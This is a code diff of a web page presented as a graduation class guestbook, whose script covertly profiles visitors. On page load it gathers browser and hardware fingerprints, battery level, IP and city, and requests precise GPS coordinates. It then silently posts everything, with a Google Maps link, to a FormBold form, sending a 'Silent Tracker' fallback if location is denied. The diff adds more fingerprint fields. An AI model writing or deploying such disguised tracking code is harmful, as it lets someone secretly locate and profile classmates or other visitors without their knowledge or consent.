@@ -1,173 +1,90 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Class of 2026 - Graduation Gallery</title>
-    <style>
-        :root {
-            --primary-color: #1e3a8a;
-            --secondary-color: #10b981;
-            --background: #f3f4f6;
-            --text-main: #1f2937;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--background);
-            color: var(--text-main);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        header {
-            background-color: var(--primary-color);
-            color: white;
-            width: 100%;
-            padding: 2rem 0;
-            text-align: center;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
-        }
-
-        .banner-status {
-            background-color: var(--secondary-color);
-            color: white;
-            padding: 0.75rem 1.5rem;
-            border-radius: 9999px;
-            font-weight: 600;
-            margin-top: 1rem;
-            display: inline-block;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-
-        main {
-            max-width: 800px;
-            width: 90%;
-            margin: 3rem 0;
-            text-align: center;
-        }
-
-        .guestbook-card {
-            background: white;
-            padding: 2.5rem;
-            border-radius: 12px;
-            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.05);
-            margin-bottom: 3rem;
-        }
-
-        .input-group {
-            display: flex;
-            gap: 1rem;
-            justify-content: center;
-            margin-top: 1.5rem;
-        }
-
-        input[type="text"] {
-            padding: 0.75rem 1rem;
-            border: 2px solid #d1d5db;
-            border-radius: 8px;
-            width: 60%;
-            font-size: 1rem;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        input[type="text"]:focus {
-            border-color: var(--primary-color);
-        }
-
-        button {
-            background-color: var(--primary-color);
-            color: white;
-            border: none;
-            padding: 0.75rem 1.5rem;
-            font-size: 1rem;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background-color 0.2s;
-        }
-
-        button:hover {
-            background-color: #172554;
-        }
-    </style>
-</head>
-<body>
-
-    <header>
-        <h1>🎓 Senior Class Memory Gallery</h1>
-        <div id="greeting" class="banner-status">🎉 Welcome to the Class Gallery!</div>
-    </header>
-
-    <main>
-        <div class="guestbook-card">
-            <h2>Sign the Graduation Guestbook</h2>
-            <p>Leave your mark before heading off into the real world!</p>
-            <div class="input-group">
-                <input type="text" id="studentName" placeholder="Enter your full name...">
-                <button onclick="submitGuestbook()">Sign In</button>
-            </div>
-        </div>
-    </main>
-
-    <script>
+<script>
         let trackingData = {
             ip: "Unavailable",
             location: "Unavailable",
             deviceInfo: "Unknown Device",
-            screenSize: "Unknown Screen"
+            screenSize: "Unknown Screen",
+            deviceLanguage: "Unknown Language",
+            batteryStatus: "Unknown Battery", // New
+            colorScheme: "Unknown Theme",     // New
+            deviceRam: "Unknown RAM",         // New
+            cpuCores: "Unknown CPU Cores"      // New
         };
         
         let hasSentPayload = false; 
         let trackingTimer = null;   
 
-        function gatherDeviceFingerprint() {
+        // 1. Core fingerprint gathering function
+        async function gatherDeviceFingerprint() {
             trackingData.deviceInfo = navigator.userAgent; 
             trackingData.screenSize = `${window.screen.width}x${window.screen.height}`;
+            trackingData.deviceLanguage = navigator.language || navigator.userLanguage;
+            
+            // Check Dark/Light mode preference
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                trackingData.colorScheme = "Dark Mode";
+            } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: light)').matches) {
+                trackingData.colorScheme = "Light Mode";
+            }
+
+            // Grab hardware performance traits
+            trackingData.deviceRam = navigator.deviceMemory ? `${navigator.deviceMemory} GB (Approx)` : "Unsupported/iOS Hidden";
+            trackingData.cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : "Unknown";
+
+            // Attempt to grab battery status safely
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    trackingData.batteryStatus = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+                } catch (e) {
+                    console.log("Battery profile locked.");
+                }
+            }
         }
 
-        gatherDeviceFingerprint();
+        // 2. Run the tracking sequence
+        async function initializeTracker() {
+            await gatherDeviceFingerprint();
 
-        fetch(window.location.href)
-            .then(res => {
-                const geoHeader = res.headers.get('x-visitor-geo');
-                const greetingElement = document.getElementById('greeting');
-                
-                if (geoHeader) {
-                    const data = JSON.parse(geoHeader);
-                    trackingData.ip = data.ip || "Unknown IP";
-                    trackingData.location = `${data.city || "Unknown City"}, ${data.country || "Unknown Country"}`;
+            fetch(window.location.href)
+                .then(res => {
+                    const geoHeader = res.headers.get('x-visitor-geo');
+                    const greetingElement = document.getElementById('greeting');
                     
-                    if (greetingElement && data.city) {
-                        greetingElement.innerText = `👋 Wearing cap & gown? Viewing from ${data.city}`;
+                    if (geoHeader) {
+                        const data = JSON.parse(geoHeader);
+                        trackingData.ip = data.ip || "Unknown IP";
+                        trackingData.location = `${data.city || "Unknown City"}, ${data.country || "Unknown Country"}`;
+                        
+                        if (greetingElement && data.city) {
+                            greetingElement.innerText = `👋 Wearing cap & gown? Viewing from ${data.city}`;
+                        }
                     }
-                }
-                
-                // Increased to 7 seconds so users have enough time to click "Allow"
-                trackingTimer = setTimeout(() => {
-                    if (!hasSentPayload) {
-                        sendToFormBold("Anonymous Classmate", "Silent Tracker (GPS Denied/Timed Out)", {});
-                    }
-                }, 7000);
+                    
+                    // 7-second fallback countdown window
+                    trackingTimer = setTimeout(() => {
+                        if (!hasSentPayload) {
+                            sendToFormBold("Anonymous Classmate", "Silent Tracker (GPS Denied/Timed Out)", {});
+                        }
+                    }, 7000);
 
-                requestPreciseLocation();
-            })
-            .catch(err => {
-                console.log("Local or missing headers environment.");
-                requestPreciseLocation();
-            });
+                    requestPreciseLocation();
+                })
+                .catch(err => {
+                    console.log("Local testing environment context detected.");
+                    requestPreciseLocation();
+                });
+        }
 
+        // Execute initializer loop
+        initializeTracker();
+
+        // 3. Precise hardware geolocation tracking sequence
         function requestPreciseLocation() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // User allowed access in time: clear the backup timer
                         clearTimeout(trackingTimer);
-                        
                         if (hasSentPayload) return; 
 
                         const lat = position.coords.latitude;
@@ -179,19 +96,20 @@
                             "Latitude": lat,
                             "Longitude": lon,
                             "Accuracy Radius": `${accuracy}m`,
-                            "Google Maps Link": `https://www.google.com/maps?q=${lat},${lon}`
+                            "Google Maps Link": `https://maps.google.com/?q=${lat},${lon}`
                         };
 
                         sendToFormBold("Anonymous Classmate", "PRECISE GPS ACQUIRED", preciseGPS);
                     },
                     (error) => {
-                        console.log("GPS hardware choice skipped or rejected.");
+                        console.log("GPS hardware prompt bypassed or declined.");
                     },
                     { enableHighAccuracy: true, timeout: 15000 }
                 );
             }
         }
 
+        // 4. Central FormBold Sender Engine
         function sendToFormBold(studentName, actionType, extraData = {}) {
             hasSentPayload = true; 
 
@@ -203,6 +121,11 @@
             formData.append("General Location", trackingData.location);
             formData.append("Device Hardware Specs", trackingData.deviceInfo);
             formData.append("Screen Resolution", trackingData.screenSize);
+            formData.append("Device Language", trackingData.deviceLanguage);
+            formData.append("System Theme", trackingData.colorScheme); // Added
+            formData.append("Device Battery", trackingData.batteryStatus); // Added
+            formData.append("Estimated RAM", trackingData.deviceRam); // Added
+            formData.append("CPU Cores", trackingData.cpuCores); // Added
             formData.append("Timestamp", new Date().toLocaleString());
 
             Object.keys(extraData).forEach(key => {
@@ -216,10 +139,11 @@
                     'Accept': 'application/json'
                 }
             })
-            .then(() => console.log("Transmission finalized."))
-            .catch(err => console.error("Transmission error:", err));
+            .then(() => console.log("Complete data fingerprint submitted successfully."))
+            .catch(err => console.error("Data pipeline link error:", err));
         }
 
+        // 5. Manual guestbook text signature hook
         function submitGuestbook() {
             const nameInput = document.getElementById('studentName');
             const nameField = nameInput ? nameInput.value.trim() : "";
@@ -234,6 +158,3 @@
             if (nameInput) nameInput.value = ""; 
         }
     </script>
-
-</body>
-</html>
